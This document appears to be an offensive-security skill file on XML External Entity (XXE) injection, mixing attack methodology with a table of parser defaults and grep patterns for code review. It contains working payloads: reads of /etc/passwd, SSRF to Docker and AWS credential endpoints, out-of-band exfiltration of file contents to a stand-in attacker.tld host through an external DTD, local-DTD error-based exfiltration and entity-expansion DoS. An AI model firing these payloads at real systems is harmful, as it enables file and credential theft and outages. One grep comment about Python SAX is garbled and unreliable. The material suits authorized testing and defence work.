---
name: xxe
description: XXE — measured parser-defaults across Java/Python/.NET/PHP/Ruby/Node, DTD-parameter-entity exfiltration (including egress-free local-DTD reuse), XInclude/XSLT surface, and cross-format expressions (SOAP/SAML/SVG/OOXML)
---

# XXE

XML External Entity injection is a parser-level failure that enables local file reads, SSRF to internal control planes, denial-of-service via entity expansion, and in some stacks, code execution through XInclude/XSLT or language-specific wrappers. Treat every XML input as untrusted until the parser is proven hardened.

The advanced+expert depth (parameter-entity OOB exfiltration deep, XInclude/XSLT full catalog, SOAP/SAML pre-signature parsing, SVG-to-PDF renderer path, egress-free multi-DTD depth, quadratic vs billion-laughs measurement, content-type-switch matrix, blind confirmation methodology) lives in `xxe_advanced_deep.md`. The 2024–2026 CVE frontier and current-frontier framing lives in `xxe_novel_deep.md`. This file is the standard-mode entry point: a hunter loading only this file is effective for the base class.

## Attack Surface

**Capabilities**
- File disclosure: read server files and configuration
- SSRF: reach metadata services, internal admin panels, service ports
- DoS: entity expansion (billion laughs), external resource amplification

**Injection Surfaces**
- REST/SOAP/SAML/XML-RPC, file uploads (SVG, Office)
- PDF generators, build/report pipelines, config importers

**Transclusion**
- XInclude and XSLT `document()` loading external resources

## High-Value Targets

**File Uploads**
- SVG/MathML, Office (docx/xlsx/ods/odt), XML-based archives
- Android/iOS plist, project config imports

**Protocols**
- SOAP/XML-RPC/WebDAV/SAML (ACS endpoints)
- RSS/Atom feeds, server-side renderers and converters

**Hidden Paths**
- Parameters: "xml", "upload", "import", "transform", "xslt", "xsl", "xinclude"
- Processing-instruction headers

## Detection Channels

### Direct

- Inline disclosure of entity content in the HTTP response, transformed output, or error pages

### Error-Based

- Coerce parser errors that leak path fragments or file content via interpolated messages

### OAST

- Blind XXE via parameter entities and external DTDs; confirm with DNS/HTTP callbacks
- Encode data into request paths/parameters to exfiltrate small secrets (hostnames, tokens)
- Use `interactsh-client -v` for the callback domain. Reference it as the
  external DTD host (e.g. `<!ENTITY % ex SYSTEM "http://xyz.oast.fun/x.dtd">`)
  and read the DNS/HTTP hit on the interactsh stdout.

### Timing

- Fetch slow or unroutable resources to produce measurable latency differences (connect vs read timeouts)

### Egress-Free Exfiltration (Local DTD Reuse)

When the parser processes DTDs but **outbound network is blocked** (no external
DTD fetch, no OAST) and the response doesn't reflect entity content, you can
still exfiltrate in-band by reusing a DTD file that already exists on the target
host and redefining one of the parameter entities it declares — the classic
GoSecure technique. Referencing the local DTD and overriding its entity makes
the parser run your exfil logic and surface the target file inside a parse
**error message**, with zero attacker-controlled network:

```xml
<!DOCTYPE r [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
  <!ENTITY % constant 'aaa)>
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; err SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval; &#x25;err;
    <!ELEMENT aa (bb'>
  %local_dtd;
]>
<r></r>
```

- The overridden entity name (`%constant` above) and the DTD path are
  **target-specific** — pick a DTD known to exist on the OS and redefine the
  parameter entity *that DTD actually references internally*. Common candidates:
  `/usr/share/xml/fontconfig/fonts.dtd` (fontconfig, redefine `%constant;`),
  JVM/`jaxp` bundled DTDs, and `/usr/share/yelp/dtd/docbookx.dtd`. Enumerate a
  readable local DTD first, then match the override to it.
- The file content lands in the error (e.g. "file not found: .../root:x:0:0:...").
  Requires that the parser expands parameter entities and surfaces errors —
  confirm both with a benign probe before the full payload.

## Core Payloads

### Local File

```xml
<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<r>&xxe;</r>
```

```xml
<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<r>&xxe;</r>
```

### SSRF

```xml
<!DOCTYPE x [<!ENTITY xxe SYSTEM "http://127.0.0.1:2375/version">]>
<r>&xxe;</r>
```

```xml
<!DOCTYPE x [<!ENTITY xxe SYSTEM "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI">]>
<r>&xxe;</r>
```

### OOB Parameter Entity

```xml
<!DOCTYPE x [<!ENTITY % dtd SYSTEM "http://attacker.tld/evil.dtd"> %dtd;]>
```

evil.dtd:
```xml
<!ENTITY % f SYSTEM "file:///etc/hostname">
<!ENTITY % e "<!ENTITY &#x25; exfil SYSTEM 'http://%f;.attacker.tld/'>">
%e; %exfil;
```

## Key Vulnerabilities

### Parameter Entities

- Use parameter entities in the DTD subset to define secondary entities that exfiltrate content
- Works even when general entities are sanitized in the XML tree

### XInclude

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</root>
```

Effective where entity resolution is blocked but XInclude remains enabled in the pipeline.

### XSLT Document — Owner Pointer

XSLT processors reach external resources via `document()`/`unparsed-text()`, extend to extension-function RCE on Xalan/Saxon-PE+EE/libxslt-PHP/.NET-`<msxsl:script>`, and share the URI-resolution threat family with XXE. `xslt_injection.md` owns the canonical treatment — per-processor primitive catalogue, Spring XsltView CVE-2026-47884 (CVSS 9.8 across Framework 5.3.0 → 7.0.8), Apache Wicket CVE-2024-36522, GeoNetwork Saxon CVE-2026-58400, and the full technique surface. Load `xslt_injection.md` when the sink is XSLT; this file retains the XML-parse-side primitives (DOCTYPE, parameter entities, XInclude, local-DTD exfil, protocol wrappers) that fire during the XML parse phase independent of any XSLT transformation. The HAPI FHIR cluster (CVE-2024-45294 / 52007 / 52807) is XXE-via-XSLT-TransformerFactory-misconfig — the parse-side mechanism is owned here; the XSLT-side enabler is cross-referenced from `xslt_injection_novel_deep.md`.

### Protocol Wrappers

- Java: `jar:`, `netdoc:`
- PHP: `php://filter`, `expect://` (when module enabled) — for the filter-chain LFI→RCE primitive (Synacktiv generator), load `path_traversal_lfi_rfi`
- Gopher: craft raw requests to Redis/FCGI when client allows non-HTTP schemes

## Bypass Techniques

**Encoding Variants**
- UTF-16/UTF-7 declarations, mixed newlines
- CDATA and comments to evade naive filters

**DOCTYPE Variants**
- PUBLIC vs SYSTEM, mixed case `<!DoCtYpE>`
- Internal vs external subsets, multi-DOCTYPE edge handling

**Network Controls**
- If network blocked but filesystem readable, pivot to local file disclosure
- If files blocked but network open, pivot to SSRF/OAST

**Content-Type Switching (reach the XML parser)**
- A JSON endpoint often has a dormant XML body parser one header away. Resend
  the request with `Content-Type: application/xml` (also `text/xml`,
  `application/*+xml`, SOAP `application/soap+xml`) and an XML body — many
  frameworks content-negotiate the body parser from the header (Spring
  `@RequestBody` via Jackson-XML/JAXB, ASP.NET model binding, Rails `params`,
  Express with an `xml` body parser). The XML path frequently uses a *different,
  less-hardened* parser than the JSON path, so an endpoint that looks
  JSON-only can be XXE-vulnerable. Try it on every JSON API before concluding
  no XML surface exists.

**Entity-Expansion DoS: Billion Laughs vs Quadratic Blowup**
- **Billion laughs** is *exponential*: nested entities each expanding the
  previous ~10× (`lol1`→10×`lol0`, ... `lol9`→10⁹ chars). Modern parsers cap
  entity nesting depth/count, which blocks it.
- **Quadratic blowup** evades those caps: define **one** large entity (say 100 KB
  of `A`) and reference it a few thousand times in the document body. Entity
  count and nesting stay tiny, but total expanded size is O(n²) → memory/CPU
  exhaustion. Use it when a billion-laughs probe is rejected by an expansion
  limit. Run either only within explicit DoS-authorized scope and with ceilings.

## Parser Defaults by Stack

"Treat every XML input as untrusted" holds, but modern defaults decide whether
a given parser is *actually* vulnerable — so fingerprint the stack before
investing in payloads. Entity-resolution defaults (Python rows measured locally
on 3.14 / lxml; others from documented behavior, marked):

| Parser | External entities by default | Notes |
|---|---|---|
| Python `xml.etree.ElementTree` | **off** — raises `ParseError` on any external/undefined entity (measured) | no external-entity support at all; XInclude/XSLT not in ET |
| Python `lxml.etree` | **off** (measured: raises); vulnerable only with `XMLParser(resolve_entities=True, no_network=False, load_dtd=True)` | `no_network=True` is the default; opt-in resolves file:// (measured) |
| Python `minidom`/`sax`/`pulldom` | external general entities off in modern CPython; use `defusedxml` to forbid DTD outright | `defusedxml.*` monkeypatches all stdlib parsers to reject DOCTYPE |
| PHP `DOMDocument`/`SimpleXML` (libxml) | **off** since libxml 2.9 (documented; test env ships libxml 2.15.3) | `libxml_disable_entity_loader()` is deprecated/no-op in PHP 8.0 because the default is already safe; vulnerable only if code opts in with `LIBXML_NOENT | LIBXML_DTDLOAD` and an entity loader that fetches |
| Java `DocumentBuilderFactory` / `SAXParserFactory` / `XMLInputFactory` (StAX) | **on** — all three measured OOTB on OpenJDK 21: `file://` fetched and returned in output; external DTD `connect()` observed | harden with `FEATURE_SECURE_PROCESSING`, `disallow-doctype-decl` on DBF/SAX. **StAX hardening is asymmetric**: `SUPPORT_DTD=false` rejects entity references but silently accepts DOCTYPE-only; use `IS_SUPPORTING_EXTERNAL_ENTITIES=false` *and* `SUPPORT_DTD=false` together on StAX |
| .NET `XmlReader.Create` (Core 6+) | **off by default** (measured on .NET 6: DOCTYPE rejected with `XmlException`); vulnerable with explicit `DtdProcessing.Parse` **and** a non-null `XmlResolver` (e.g., `new XmlUrlResolver()`) — measured with opt-in, fetches `file://` | .NET Framework 4.5.2+ same defaults; earlier .NET Framework versions vulnerable OOTB |
| .NET `XmlDocument` / `XmlTextReader` | `XmlDocument` uses `XmlReader` internally on modern .NET, inherits the same defaults. `XmlTextReader` — **runtime-qualified**: legacy .NET Framework `XmlTextReader` resolves by default; .NET Core / .NET 6+ reimplementation of `XmlTextReader` does NOT resolve `file://` OOTB (measured: no fetch, no text emitted). Guidance blaming "legacy `XmlTextReader` resolves by default" must state the runtime | on Framework, harden with `XmlResolver = null` + `DtdProcessing = Prohibit` |
| Ruby `Nokogiri::XML` default | **off** (measured on Nokogiri current: internal entity expanded, `file://` elided from output, no fetch) | vulnerable only with `Nokogiri::XML(input) { |c| c.noent.dtdload.dtdvalid.do_xinclude }` opt-in (measured to fetch `file://` and XInclude when all four flags set) |
| Ruby `REXML` (stdlib) | **off** (measured: internal general entity kept as literal `&xxe;` in output, no external resolution) | REXML's stdlib design is safe-by-default |
| Node `xml2js` / `sax` (pure JS) | **rejects entity references in strict mode** (measured); no external-entity resolution at all — pure JS with no libxml2/expat backend | not applicable — the parsers do not implement external-entity resolution |
| Node `libxmljs2` (libxml2 binding) | inherits libxml2 defaults — see PHP libxml row above | opt-in required with `noent: true, dtdload: true` |

Practical read: **Java is the stack most likely vulnerable out of the box** —
all three default parsers (DBF, SAX, StAX) measured OOTB fetch `file://` and
initiate the external-DTD connect; Python (ET/lxml default), modern PHP
(libxml 2.9+), .NET 6+ (default `XmlReader.Create`), Ruby (Nokogiri default,
REXML), and Node (xml2js/sax) are all safe by default *for entity resolution*,
so a finding on those stacks is misconfiguration (opt-in flags set) or a
legacy parser (pre-Core .NET `XmlTextReader`). XInclude and XSLT are
**separate switches** that frequently stay enabled after entity resolution is
disabled (Pro Tip 3), so keep probing them regardless of the entity-default
above. All measurements above were captured on 2026-09-29 with the specific
parser versions logged at `.zen-batch-artifacts/batch-6-*/measurements/xml-parsers/`.

## Special Contexts

### SOAP

```xml
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <!DOCTYPE d [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    <d>&xxe;</d>
  </soap:Body>
</soap:Envelope>
```

### SAML

- Assertions are XML-signed, but upstream XML parsers prior to signature verification may still process entities/XInclude
- Test ACS endpoints with minimal probes

### SVG and Renderers

- Inline SVG and server-side SVG→PNG/PDF renderers process XML
- Attempt local file reads via entities/XInclude

### Office Docs

- OOXML (docx/xlsx/pptx) are ZIPs containing XML
- Insert payloads into document.xml, rels, or drawing XML and repackage

## Framework XML Handlers

Each stack ships default XML consumers whose parser configuration decides whether XXE is a live surface:

- **Spring MVC / WebFlux** — Jackson-XML (`XmlMapper`) via `@RequestBody` binding when the request Content-Type is `application/xml` or `text/xml`; JAXB via `MarshallingHttpMessageConverter`. Both wrap `DocumentBuilderFactory` under the hood; the default Spring Boot configuration hardens JAXB but Jackson-XML may not, depending on Spring/Jackson versions. Content-type-switch from JSON to XML often reaches a less-hardened path.
- **JAX-RS (Jersey, RESTEasy)** — `@Consumes(MediaType.APPLICATION_XML)` handlers use JAXB by default; JAXB's underlying parser inherits `SAXParserFactory` defaults, so Java-parser-defaults apply.
- **ASP.NET Core** — `XmlSerializer` / `DataContractSerializer` via input formatters; both use `XmlReader.Create` under the hood with the .NET 6+ safe default. Legacy ASP.NET Framework uses `XmlDocument` with the Framework-era defaults.
- **Django REST Framework** — `XMLParser` (django-rest-framework-xml) uses `xml.etree.ElementTree` — Python defaults apply; not vulnerable OOTB.
- **Rails** — `Hash.from_xml` (ActiveSupport) uses Nokogiri under the hood with Rails-tightened defaults (external entities disabled since a 2013 Rails hardening); direct Nokogiri usage in application code may reset to opt-in.
- **Express + `xml2js` or `body-parser-xml`** — Node parsers; pure JS, no external-entity resolution (see parser-defaults table).
- **PHP frameworks (Laravel, Symfony)** — libxml2 defaults apply; safe since libxml 2.9. Route to the frameworks/*.md files for framework-specific expressions.
- **gRPC/protobuf** — not XML; no XXE surface. Some gRPC gateways transcode JSON/XML — a transcoder that accepts XML input reintroduces the surface.
- **Legacy SOAP endpoints** — Axis2, CXF, Metro, .NET WCF — all use their language's XML parser defaults; the SOAP envelope's outer DOCTYPE (if honored) is the entry point.

**Frameworks that ship an XML body parser but disable it by default (opt-in required):**
- Express without an XML body parser installed — the app has no XML consumer unless one is added explicitly.
- FastAPI / Starlette — same; JSON-only by default.
- Modern Node frameworks generally require explicit `express.xml()` or equivalent middleware.

**Second-Order XXE** — stored XML that a background processor consumes later. Distinct from the request-time consumer above; the second-order shape is common in batch processing pipelines:
- User uploads or submits XML that the app *stores* (blob storage, DB, queue) without parsing. A downstream job runs later — a report generator, a data-import processor, an analytics aggregator — and parses the stored XML with its own (potentially less-hardened) parser. The second-order shape defeats WAFs that inspect user requests but not internal job queue processing.
- Test-result processors (CI systems reading JUnit XML from builds) — the canonical shape (see `xxe_novel_deep.md § Allure Report DocumentBuilderFactory — CVE-2025-52888` for the current instance).
- Log-ingest pipelines that parse structured logs including XML — the log-ingest service is often less scrutinized than the front-facing API.
- Import/export utilities (Confluence, Jira, JIRA-alike ticket systems) — user imports an "archive," the archive's XML content is parsed at import time in a background worker.

Second-order XXE requires: (a) the ability to store the payload (upload, submit, or otherwise inject it into the pipeline), and (b) knowledge or discovery that a downstream processor exists and parses XML. The confirmation is oracle-shaped — the downstream job's parse may not surface a response to the original request. Use OOB / OAST as the primary oracle for second-order confirmations.

## Parser Call-Site Grep Patterns

For code-review-assisted assessments, enumerate every XML-parser instantiation in the target codebase. Each call site is a candidate for the class; the presence or absence of hardening flags at each site determines exposure. Per-language grep patterns:

**Java:**
```
grep -rn 'DocumentBuilderFactory.newInstance()' src/          # DBF
grep -rn 'SAXParserFactory.newInstance()' src/                # SAX
grep -rn 'XMLInputFactory.newInstance()' src/                 # StAX
grep -rn 'SchemaFactory.newInstance(' src/                    # XSD validation
grep -rn 'TransformerFactory.newInstance()' src/              # XSLT
grep -rn 'XMLReaderFactory.createXMLReader()' src/            # legacy
```
For each site, verify the accompanying hardening: `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)` on DBF/SAX; `setProperty(XMLInputFactory.SUPPORT_DTD, false)` and `IS_SUPPORTING_EXTERNAL_ENTITIES` on StAX (both required — the asymmetry noted in the parser-defaults table above).

**Python:**
```
grep -rn 'xml.etree.ElementTree' .        # stdlib ET (safe by default)
grep -rn 'lxml.etree' .                   # lxml — check for resolve_entities/no_network overrides
grep -rn 'from lxml import' .
grep -rn 'xml.sax' .                      # SAX — check DEFAULT_TIMEZONES
grep -rn 'xml.dom.minidom' .              # minidom
grep -rn 'defusedxml' .                   # if imported, class is closed
```
`defusedxml` presence is defensive; its absence at a site plus `lxml.etree.XMLParser(resolve_entities=True, no_network=False, load_dtd=True)` is the vulnerable pattern.

**PHP:**
```
grep -rn 'new DOMDocument' .
grep -rn 'simplexml_load_string' .
grep -rn 'simplexml_load_file' .
grep -rn 'XMLReader::' .
grep -rn 'LIBXML_NOENT' .                 # opt-in flag — presence indicates vulnerable
grep -rn 'LIBXML_DTDLOAD' .
grep -rn 'libxml_disable_entity_loader' . # deprecated in PHP 8.0
```
`LIBXML_NOENT | LIBXML_DTDLOAD` combined at a call site re-enables the vulnerable behavior even on libxml 2.9+.

**Node.js:**
```
grep -rn 'require.*libxmljs' .            # libxmljs2 binding
grep -rn 'require.*xml2js' .              # pure JS — no XXE surface
grep -rn 'require.*sax' .                 # pure JS
grep -rn '\.parseString(' .               # xml2js API
```
Pure-JS parsers (`xml2js`, `sax`) have no external-entity resolution by design; `libxmljs2` inherits libxml2's opt-in flags.

**Ruby:**
```
grep -rn 'Nokogiri::XML' .
grep -rn '\.noent' .                      # opt-in flag
grep -rn '\.dtdload' .
grep -rn '\.dtdvalid' .
grep -rn 'REXML::Document' .              # stdlib REXML — safe by default
```
The chain `Nokogiri::XML(input) { |c| c.noent.dtdload.dtdvalid }` at a call site is the vulnerable configuration.

**.NET:**
```
grep -rn 'XmlDocument()' .                # legacy API
grep -rn 'XmlTextReader' .                # runtime-dependent (see parser-defaults table)
grep -rn 'XmlReader.Create' .             # modern
grep -rn 'DtdProcessing.Parse' .          # opt-in
grep -rn 'new XmlUrlResolver()' .         # opt-in resolver
```
`DtdProcessing.Parse` combined with a non-null `XmlResolver` at a call site is the vulnerable pattern on .NET 6+.

Every call site should be inventoried and each verified against the hardening template appropriate to its parser family. A single missed hardening at a network-reachable path reopens the class.

## Sink Fingerprinting

Before firing XXE payloads, classify the sink — the primitive it produces and the confirmation oracle you can rely on both depend on it.

**Full-XML parsers** — `DocumentBuilderFactory` / `SAXParser` / `XMLInputFactory` (Java), `libxml2`-based (`DOMDocument`, Nokogiri opt-in, PHP `XMLReader`), `System.Xml.XmlReader` (.NET). Support DOCTYPE, entities, XInclude, XSLT. XXE primitives are the full catalog — file read via general entity, SSRF via `SYSTEM` URI, OOB via parameter entity + external DTD, XInclude, XSLT `document()`.

**SAX event streams** — the parser emits events (`startElement`, `characters`, `endElement`) as it parses. External-entity resolution happens per event; the API surface differs but the underlying entity behavior is the same as DOM. XXE payloads work identically.

**Streaming pull parsers** (StAX / `XMLPullParser`) — the caller drives the parse by calling `next()`. Entity resolution runs during the pull. StAX in Java has its own set of `XMLInputFactory` properties (`SUPPORT_DTD`, `IS_SUPPORTING_EXTERNAL_ENTITIES`) that differ from DBF/SAX hardening — see the parser-defaults table for the measured asymmetry.

**Schema validators** — parsing a document against an XSD schema. The schema itself (an XML document) is parsed; the target document is parsed. Both are XML-parsing surfaces. `xsi:schemaLocation` in the target document may point at an attacker-controlled URL, giving SSRF.

**XSLT engines** — `Transformer` (Java), `libxslt` (Python `lxml`, PHP `XSL`), `.NET XslCompiledTransform`. XSLT is XML processed as code; `document()`, `xsl:include`, `xsl:import` are file-read primitives; some engines execute scripts (`xsl:script` in older Xalan) that reach RCE. Cover in `xxe_advanced_deep.md § XSLT Depth`.

**SAML / OAuth-signed XML** — SAML assertions are XML with a signature; some ACS endpoints parse the assertion (including entity expansion) *before* verifying the signature, exposing the parse-side XXE. Fingerprint: does the ACS accept a DOCTYPE-containing assertion and produce a parse-shape response before signature-verification?

**XPath/XQuery evaluators** — `XPathExpression.evaluate()` on an untrusted context node inherits the parser's entity behavior. XPath itself doesn't have an XXE surface, but the XML being queried does.

**In-response reflected vs response-consuming:**
- **Response-reflecting** — the parsed content reaches the HTTP response body (a REST endpoint that returns the parsed data). Direct oracle: file bytes appear in the response.
- **Response-consuming** — the parsed content is used server-side (queue message, log entry, DB insert) with no direct response reflection. Requires OOB / error-based / blind confirmation.

The sink's reflection behavior decides the confirmation approach; probe with a small test entity (`<!ENTITY test "MARKER">`) and check whether MARKER reaches the response before designing the actual exfil path.

## Confirmation Discipline

XXE's confirmation surface has multiple layers of specificity; do not overclaim from a weaker signal.

- **DOCTYPE accepted but no entity resolution** — the parser accepts `<!DOCTYPE>` (no error) but does not resolve external entities (`&xxe;` stays literal in output, or produces an "entity not defined" error). This is *not* XXE — the parser is configured with DOCTYPE processing on but external-entity resolution off. Report as "DOCTYPE processed" not as XXE.
- **Entity resolution succeeds but `file://` is blocked** — general entity expansion works, external HTTP references fetch, but `file://` returns an empty entity or an error. The parser is configured with URL-scheme allowlisting. Report SSRF-shaped exposure but not file-read.
- **`file://` fetched but content is stripped from response** — the parser fetches the file, but a downstream sanitizer removes the content before the response goes out. OOB confirmation still works; direct-reflection does not. Do not claim disclosure from a `no-content` response.
- **OAST callback without response reflection** — the parser fetched the URL, but the response doesn't reflect the parsed data. This is SSRF-shaped confirmation (fetch happened) but not disclosure confirmation (content did not reach the response). Continue to OOB parameter-entity exfiltration for actual file content.
- **Error-based reflection with partial content** — a parse error message includes a fragment of the fetched content (path prefix, first line, MIME-header-shape); this is disclosure of *that fragment*, not of the whole file. Iterate the payload for line-by-line if further extraction is needed.
- **Timing signal without content** — a longer response time on the traversal payload than the control indicates something happens (fetch, entity expansion) that didn't happen otherwise; useful for detecting parser response to entities but not for content extraction.

The finding is: (a) DOCTYPE processed, (b) entity resolved, (c) file bytes reached, (d) file bytes appeared in response. Each is a distinct step; each is confirmed by a distinct oracle. Report the highest-confirmed step, not the highest-hoped step.

## Tooling

- **XXExploiter** — automated XXE exploitation helper; generates OOB DTDs and hosts them on a callback server. `github.com/luisfontes19/xxexploiter`. Handy for OOB exfil against blind targets.
- **interactsh-client** — the OAST callback for blind XXE; a DNS or HTTP hit confirms the parser dereferenced an external URL. Use both signals: DNS-only proves hostname resolution; HTTP-hit proves fetch.
- **Burp Suite / OWASP ZAP** — request repeat with modified DOCTYPE header; useful for iterating parser-hardening probes. Burp's Collaborator is a first-class OAST alternative to interactsh.
- **`xmllint`** — libxml2's CLI tool; useful for constructing and testing XML payloads locally against a known parser (validates the payload is well-formed and produces the expected entity behavior against libxml2 defaults).
- **`saxonc` / Saxon-HE** — for validating an XSLT payload's behavior locally before firing against a target.
- **XML External Entity (XXE) Injection Payload List** — the standard payload catalog at `github.com/payloadbox/xxe-injection-payload-list` — useful reference; validate every payload against the target parser rather than treating the list as definitive.
- **`XXEinjector`** — Ruby tool for XXE exploitation; automates OOB entity techniques including recursive extraction. Older but still functional for reference.
- **Semgrep XXE rules** — SAST rules covering the common vulnerable patterns per language (`p/xxe` ruleset); useful for code-review-assisted assessments to grep the target codebase.
- **`dumpster-diver`** — for identifying XXE-adjacent misconfiguration patterns in codebases through static analysis.

## Chaining

XXE is almost never terminal — the file-read / SSRF / DoS / occasional-RCE primitives it produces are pivots into downstream classes. Model the chaining as capability transfer, routed by filename.

**Upstream — what grants XXE:**
- **Content-type coercion** — the app has an XML body parser one header away. Load `xxe_advanced_deep.md § Content-Type Switching` for the JSON-endpoint-with-XML-fallback exploitation shape.
- **Upload endpoint that accepts an XML-containing format** — SVG, DOCX, XLSX, plist, RSS/Atom, XMPP payload, SAML assertion. Route to `file_upload` for the upload primitive; the XML parsing is where XXE fires.
- **Third-party integration** — a webhook/callback endpoint accepting XML from a partner; the parser is often less hardened than the customer-facing endpoints. SOAP, XML-RPC, WebDAV headers are the common shapes.

**Downstream — what XXE grants:**
- **File disclosure** — arbitrary read as the process identity; route the extraction to `path_traversal_lfi_rfi.md` for target-file catalog and impact prioritization.
- **SSRF-shaped reach** — the parser fetches `http://`/`https://` from `SYSTEM` URIs, reaching internal HTTP services; route to `ssrf.md` for internal target catalog and parser-differential class.
- **SSRF to cloud metadata (reachability only)** — the parser's HTTP fetch can hit `169.254.169.254` and equivalent metadata services on cloud runtimes. XXE-class files claim **metadata reachability only**; credential extraction routes to `cloud/aws.md`, `cloud/gcp.md`, `cloud/azure.md`.
- **DoS via entity expansion** — billion laughs and quadratic blowup produce resource exhaustion; only run in explicit DoS-authorized scope with hard ceilings.
- **RCE via XSLT / expect://** — some XSLT engines (older Xalan-J with `xsl:script`, some Saxon builds) execute scripts during transform; PHP with `expect://` scheme enabled reaches shell exec. Route to `insecure_deserialization.md` for JNDI-injection expressions of the Java-based XSLT RCE class.
- **RCE via jar://** — a Java parser accepting `jar:http://...` downloads and reads inside a JAR; combined with a class-loader that treats the internal file as classpath, arbitrary code delivery.

**Composite chains — end-to-end:**
1. **SVG upload → XXE → `file:///etc/passwd`** — upload an SVG containing DOCTYPE + `SYSTEM "file://"` entity; the server-side SVG-to-PNG renderer parses the XML and dereferences the entity.
2. **SAML SP-Initiated SSO → pre-signature XXE → account takeover credentials** — some SAML ACS endpoints parse the assertion (including entity expansion) before verifying the signature; XXE reads local secrets used to sign responses. Route to `authentication_jwt.md` and `authentication_saml.md`.
3. **DOCX file-import → XXE → internal admin API SSRF** — DOCX is ZIP+XML; embed a DOCTYPE payload in `word/document.xml`; the server-side document processor's XML parser fetches internal HTTP.
4. **OpenAPI/Swagger XML variant → XXE via SDK generator** — a spec-import feature that accepts XML variants parses them with a default-config parser; XXE reads spec-generator-user secrets.

Chaining is reachability/enablement — a granted capability, not a severity multiplier.

## Frontier CVE Routes

Base names + one-line class shape; the version tables and mechanism decomposition live in the novel sibling.

- **Allure Report — CVE-2025-52888** — three Allure plugins (`junit-xml-plugin`, `trx-plugin`, `xunit-xml-plugin`) use `DocumentBuilderFactory` without DTD/external-entity restriction. The trigger is `allure generate` processing attacker-controlled XML in test-result directories; primitive is arbitrary file disclosure + SSRF, with silent exploitation in CI/CD environments — a canonical 2025 CI/CD expression of the Java-parser-defaults class this base's measured table already frames. Full version boundary + mechanism prose + the specific patch shape (a `ClasspathEntityResolver` install rather than the standard OWASP hardening — see `xxe_novel_deep.md § Allure Report DocumentBuilderFactory — CVE-2025-52888`) in the novel sibling.
- **XSLT-side CVE routes** — the XSLT CVE catalogue (Apache Wicket CVE-2024-36522 CVSS 9.8, Spring Framework XsltView CVE-2026-47884 CVSS 9.8, GeoNetwork Saxon CVE-2026-58400 CVSS 9.1, XMLUnit CVE-2024-31573, HL7/HAPI FHIR cluster CVE-2024-45294 / 52007 / 52807, Apache Camel Quarkus CVE-2026-88789, langchain-text-splitters CVE-2025-6985, libxslt UAFs, Firefox XSLT UAFs) lives in `xslt_injection_novel_deep.md`. Where the primary mechanism is parse-side XXE enabled by an XSLT configuration (HAPI FHIR cluster), the primary owner is this file; the XSLT configuration is the enabler. Where the primary mechanism is XSLT extension-function reach (Wicket, GeoNetwork, Spring XsltView), the primary owner is `xslt_injection`.

## Confirmation Oracle by Impact Goal

Quick reference mapping desired impact claim to the confirmation-oracle shape and the minimal payload that produces it — a lookup table for choosing the *evidence*, referencing the payloads defined in Core Payloads above.

- **Confirm parser accepts DOCTYPE** — `<!DOCTYPE r [<!ENTITY t "MARKER">]><r>&t;</r>` → `MARKER` in response = DOCTYPE processed + internal entity expanded.
- **Confirm external entity resolution** — `<!DOCTYPE r [<!ENTITY x SYSTEM "http://<oast>/x">]><r>&x;</r>` → OAST hit = external resolution live.
- **Confirm file read (direct)** — `<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/hostname">]><r>&x;</r>` → hostname in response = file read direct.
- **Confirm file read (blind, OOB)** — parameter-entity + external-DTD chain (see Core Payloads > OOB Parameter Entity above) → OAST hit with file content in path = blind file read.
- **Confirm SSRF (internal HTTP)** — `<!DOCTYPE r [<!ENTITY x SYSTEM "http://127.0.0.1:8080/admin">]><r>&x;</r>` → admin page content in response = SSRF-shaped reach.
- **Confirm SSRF to cloud metadata (reachability only, no credentials)** — `<!DOCTYPE r [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">]><r>&x;</r>` → metadata response = reachability confirmed; credential extraction routes to `cloud/aws.md` etc.
- **Confirm XInclude (when entity resolution is blocked)** — `<r xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/hostname"/></r>` → hostname in response = XInclude live even with DOCTYPE disabled.
- **Confirm XSLT `document()` (when transform surface is present)** — route to `xslt_injection.md § Detection Channels` for the full XSLT confirmation oracle. The one-liner `<xsl:copy-of select="document('file:///etc/hostname')"/>` is still a valid probe; the full per-processor set lives in the XSLT skill.
- **Confirm entity-expansion DoS surface (billion laughs)** — nested-entity payload; run only in DoS-authorized scope with hard limits.
- **Egress-free file read (local DTD reuse)** — see Detection Channels > Egress-Free Exfiltration above; the payload class where all outbound is blocked but a local DTD can be redefined to surface content in a parse-error message.

Pick the minimal payload that produces the strongest evidence for the intended impact claim; do not chain unnecessarily during confirmation.

## Testing Methodology

1. **Inventory consumers** - Endpoints, upload parsers, background jobs, CLI tools, converters, third-party SDKs
2. **Capability probes** - Does parser accept DOCTYPE? Resolve external entities? Allow network access? Support XInclude/XSLT?
3. **Establish oracle** - Error shape, length/ETag diffs, OAST callbacks
4. **Escalate** - Targeted file/SSRF payloads
5. **Validate parity** - Same parser options must hold across REST, SOAP, SAML, file uploads, and background jobs

## Validation

1. Provide a minimal payload proving parser capability (DOCTYPE/XInclude/XSLT)
2. Demonstrate controlled access (file path or internal URL) with reproducible evidence
3. Confirm blind channels with OAST and correlate to the triggering request
4. Show cross-channel consistency (e.g., same behavior in upload and SOAP paths)
5. Bound impact: exact files/data reached or internal targets proven

## False Positives

- DOCTYPE accepted but entities not resolved and no transclusion reachable
- Filters or sandboxes that emit entity strings literally (no IO performed)
- Mocks/stubs that simulate success without network/file access
- XML processed only client-side (no server parse)

Common shapes that look like XXE but are not:

- **Parser echoes the DOCTYPE fragment in an error message** — the response contains `<!DOCTYPE ...>` literal because the error handler echoed the input. That is parameter reflection, not entity resolution. Confirm with a distinct entity-reference probe (`&test;` with `<!ENTITY test "MARKER">`) — MARKER in the response body is the actual signal.
